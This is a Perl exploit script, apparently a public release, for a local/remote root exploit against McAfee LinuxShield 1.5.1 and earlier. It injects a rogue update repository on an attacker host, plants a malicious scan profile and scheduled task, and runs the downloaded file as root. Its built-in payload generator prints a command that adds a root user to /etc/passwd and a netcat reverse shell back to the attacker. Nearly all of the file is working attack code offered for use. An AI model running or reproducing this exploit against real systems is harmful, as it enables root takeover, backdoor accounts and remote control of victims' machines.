#!/usr/bin/perl

##
#  Title:     McAfee LinuxShield <= 1.5.1 Local/Remote Root Exploit
#  Name:      nailsRoot.pl
#  Author:    Nikolas Sotiriu (lofi) <lofi[at]sotiriu.de>
#  WARNING:   This Exploit deletes the default Update Server
#
#  Use it only for education or ethical pentesting! The author accepts 
#  no liability for damage caused by this tool.
#  
##

use strict;
use IO::Socket::SSL;
use Getopt::Std;

my %args;
my $ack;
my $timestamp;

getopt('h:p:u:v:e:a:g:', \%args);

my $gen_exec    = $args{g};

if (defined $gen_exec) {
	genEx($gen_exec);
}

my $target_host = $args{h} || usage();
my $target_port = $args{p} || 65443;
my $nails_user  = $args{u} || usage();
my $nails_pass  = $args{v} || "";
my $exec_path   = $args{e} || "/opt/McAfee/cma/scratch/update/catalog.z";
my $my_host     = $args{a} || "";

my $range = 50000000;
my $minimum = 90000000;

my $randomtask = int(rand($range)) + $minimum;

my $pre="sconf ODS_99 ";
my $post="\x0d\x0a";

my $setrepo1='db set 1 _table=repository status=1 siteList=<?xml\ version="1.0"\ encoding="UTF-8"?><ns:SiteLis'.
             'ts\ xmlns:ns="naSiteList"\ GlobalVersion="20030131003110"\ LocalVersion="20091209161903"\ Type="Clie'.
             'nt"><SiteList\ Default="1"\ Name="SomeGUID"><HttpSite\ Type="repository"\ Name="EvilRepo"\ Order="1"'.
             '\ Server="';

my $setrepo2=':80"\ Enabled="1"\ Local="1"><RelativePath>nai</RelativePath><UseAuth>0</UseAut'.
             'h><UserName></UserName><Password\ Encrypted="0"/></HttpSite></SiteList></ns:SiteLists> _cmd=update';

my $setsite="task setsitelist";

my $begin="begin";

my$set="set ";
my $profile=" nailsd.profile.ODS_99.allFiles=true nailsd.profile.ODS_99.childInitTmo=60".
       " nailsd.profile.ODS_99.cleanChildren=2 nailsd.profile.ODS_99.cleansPerChild=10000 nailsd.profile.ODS".
       "_5.datPath=/opt/NAI/LinuxShield/engine/dat nailsd.profile.ODS_99.decompArchive=true nailsd.profile.".
       "ODS_99.decompExe=true nailsd.profile.ODS_99.engineLibDir=/opt/NAI/LinuxShield/engine/lib nailsd.prof".
       "ile.ODS_99.enginePath=/opt/NAI/LinuxShield/engine/lib/liblnxfv.so".
       " nailsd.profile.ODS_99.factoryInitT".
       "mo=60 nailsd.profile.ODS_99.heuristicAnalysis=true nailsd.profile.ODS_99.macroAnalysis=true nailsd.p".
       "rofile.ODS_99.maxQueSize=32 nailsd.profile.ODS_99.mime=true nailsd.profile.ODS_99.noJokes=false nails".
       "d.profile.ODS_99.program=true nailsd.profile.ODS_99.quarantineChildren=1 nailsd.profile.ODS_99.quaran".
       "tineDirectory=/quarantine nailsd.profile.ODS_99.quarantinesPerChild=10000 nailsd.profile.ODS_99.scan".
       "Children=2 nailsd.profile.ODS_99.scanMaxTmo=301 nailsd.profile.ODS_99.scanNWFiles=true nailsd.profil".
       "e.ODS_99.scanOnRead=true nailsd.profile.ODS_99.scanOnWrite=true nailsd.profile.ODS_99.scannerPath=".
       "$exec_path".
       " nailsd.profile.ODS_99.scansPerChild=10000 nailsd.profile.ODS_99.sl".
       "owScanChildren=0 nailsd.profile.ODS_99.filter.0.type=exclude-path nailsd.profile.ODS_99.filter.0.pat".
       "h=/proc nailsd.profile.ODS_99.filter.0.subdir=true nailsd.profile.ODS_99.filter.extensions.mode=all ".
       "nailsd.profile.ODS_99.filter.extensions.type=extension nailsd.profile.ODS_99.action.Default.primary=".
       "Clean nailsd.profile.ODS_99.action.Default.secondary=Quarantine nailsd.profile.ODS_99.action.App.pri".
       "mary=Clean nailsd.profile.ODS_99.action.App.secondary=Quarantine nailsd.profile.ODS_99.action.timeou".
       "t=Pass nailsd.profile.ODS_99.action.error=Block";

my $commit="commit ";

my $setdb=" _table=schedule taskName=$randomtask taskType=On-Demand taskInfo=profileName=ODS_99,".
        "paths=path:/root/tmp;exclude:false timetable=type=unscheduled taskResults=0 i_lastRun=1260318482 status=Stopped _cmd=insert";
	#update _where= i_taskId=2";

my $execupd="task nstart LinuxShield Update";
my $execute="task nstart $randomtask";

banner();

if ($exec_path eq "/opt/McAfee/cma/scratch/update/catalog.z") {
	if ($my_host eq "") {
		usage();
	}
	stOne();
}else{
	stTwo();
}

sub stOne {
	my $reposock = IO::Socket::SSL->new(
                        PeerAddr => $target_host,
                        PeerPort => $target_port,
                        Proto    => 'tcp',
        );

	if (defined $reposock) {
		print "[*] Executing Stage One\n";
		print "-----------------------\n";		

                $ack=<$reposock>;
                print $ack;

                print $reposock "auth ".$nails_user." ".$nails_pass.$post;
                $ack=<$reposock>;
                if ($ack=~m/ERR authentication failure/){
                        print "[-] Authentication failed...\n";
                        exit(1);
                }
                print $ack;
                sleep(1);

                print "[+] Repo update: inject evil repo\n";
                print $reposock $setrepo1.$my_host.$setrepo2.$post;
                sleep(1);

                print "[+] Repo Site update: update site task\n";
                print $reposock $setsite.$post;
                $ack=<$reposock>;
                print $ack;
                sleep(1);

                print "[+] Execute AV Update: downloading evil code\n";
                print $reposock $execupd.$post;
                sleep(5);  # Update needs a bit time
		$reposock->shutdown(1);
		
	}
	stTwo();
}

sub stTwo {
        my $sock = IO::Socket::SSL->new(
                        PeerAddr => $target_host,
                        PeerPort => $target_port,
                        Proto    => 'tcp',
        );

	if (defined $sock) {
                print "\n\n[*] Executing Stage TWO\n";
                print "-----------------------\n";

		$ack=<$sock>;
		print $ack;
		
		print $sock "auth ".$nails_user." ".$nails_pass.$post;
		$ack=<$sock>;
		if ($ack=~m/ERR authentication failure/){
			print "[-] Authentication failed...\n";
			exit(1);
		}
		print $ack;
		sleep(1);

		print $sock $pre.$begin.$post;
		$ack=<$sock>;
		print $ack;
			$ack=~s/\+OK //g;
			$timestamp=$ack;
			$timestamp=~ s/\s+$//;
			print "[+] Timestamp: $timestamp\n";
		print "[+] Profile: Injecting evil Profile\n";
		print $sock $pre.$set.$timestamp.$profile.$post;
		sleep(1);

		print "[+] Commit: Profile changes\n";
		print $sock $pre.$commit.$timestamp.$post;
		sleep(1);

		print "[+] Schedule: Injecting evil task $randomtask\n";
		print $sock "db set ".$timestamp.$setdb.$post;
		sleep(1);

		print "[+] Excute: Task $randomtask\n";
		print $sock $execute.$post;
		$sock->shutdown(1);
		print "[+] Done... Check whatever you did\n";
	} else {
  	        print "[-] some troubles with connection: $!\n" ;
	}
}

sub usage {

    print "\n";
    print " nailsRoot.pl - McAfee LinuxShield local/remote Root Exploit\n";
    print "===============================================================\n\n";
    print "  Usage:\n";
    print "           $0 -h <target ip> -u <user> -v <pass> [-a <my host>|-e <executable>]\n";
    print "  Optional:\n";
    print "           -a       <attacker host with httpd>\n";
    print "           -e       <executable file on target host>\n";
    print "           -p       <target port (default: 65443)>\n";
    print "           -g (1|2) <generat shell scripts to execute>\n";
    print "                    1 <UID 0 user add>\n";
    print "                    2 <reverse nc shell>\n";
    print "  Notes:\n";
    print "           -We can not handle arguments given to executable\n";
    print "            in the -e option.\n";
    print "           -To download your own evil executable, start a httpd\n";
    print "            and set the -a option. Create the directory <nai> in\n";
    print "            your wwwroot and rename your executable to <catalog.z>\n";
    print "  Author:\n";
    print "           Nikolas Sotiriu (lofi)\n";
    print "           url: www.sotiriu.de\n";
    print "           mail: lofi[at]sotiriu.de\n";
    print "\n";


    exit(1);
}

sub genEx {
    my ($code)=@_;
    
    if ($code==1) {
        print STDERR << "EOF";

============== UID 0 user add ==============

Copy this lines to the catalog.z file.

USER=haxxor PASS=haxxorPass

-------------- cut -------------- 
#!/bin/sh
echo haxxor:AzFQk89Xgpp8s:0:0::/:/bin/sh >> /etc/passwd
-------------- /cut -------------- 

EOF
    
    } elsif ($code==2) {
        print STDERR << "EOF";

============== reverse nc shell ==============

Copy this lines to the catalog.z file.

-------------- cut --------------
#!/bin/sh
nc -nv <yourip> 4444 -e /bin/sh
-------------- /cut --------------

EOF

    }

	exit(1);

}

sub banner {
	print STDERR << "EOF";
--------------------------------------------------------------------------------
         nailsRoot.pl - McAfee LinuxShield local/remote Root Exploit
--------------------------------------------------------------------------------
                                                                                
                                   111 1111111                                  
                            11100 101 00110111001111                            
                        11101 11 10 111 101 1001111111                          
                    1101  11 00 10 11  11 111 1111111101                        
                 10111 1 10 11 10  0 10  1 1 1  1111111011                      
              1111  1 1 10  0  01 01 01 1 1 111     1111011101                  
            1000   0 11 10 10  0 10 11 111 11111 11 1111 111100                 
          1111111111 01 10 10 11 01 0  11 11111111111 1 1111  11                
         10111110 0  01 00 11 1110 11 10 11111111111 11 11111  11   111         
        101111111 0 10  01 11 1 11 0 10 11 1111111111111111 1111110000111       
        011111 0110 10 10  0 11 1 11 01 01 111111111111111 1 11110011001        
       1011111 0110 10 11 1110 11 1 10 11111111111111111111  1 100  001         
       1011111 0 10 10 01 1  0 1 11 1 111111111111111111111111 001101           
        011111 0  0  0 11 0 1111 0 11 01111111111111111111111111  01            
       1111111 01 01 111  1 1111 1 11 1111111111111111111111 1101 1111          
      111 1111 10  0 111110 0111 0 1  0111111111111111111111 11111 1111         
     111 11111  1  11 1 1 1    111 11 11111111111111111111111110    1001        
    111 1011111   1 11111111110111111111111111111111111111111 01 10111001       
   11 1100    10110110    10001        11101111111111111111  10 111 11100       
  111  00      1011101      00101       0  11111111111111111001 11  111101      
  11  00        00 101      1000011     1011   1111   1111111000 1111111 0      
  11 00          0   1011      100001    101000 1 1001         00001111  01     
  01101          11111 1011               01100    0101          110  11 10     
  10111                   1                0  01    0000011         10    10    
   10011                                    11100       1111         101   11   
      1110 01                                 101011                   1001100  
         1111000011                            1  111                           
                11000001111                                                     
                           1                                                    

EOF
}
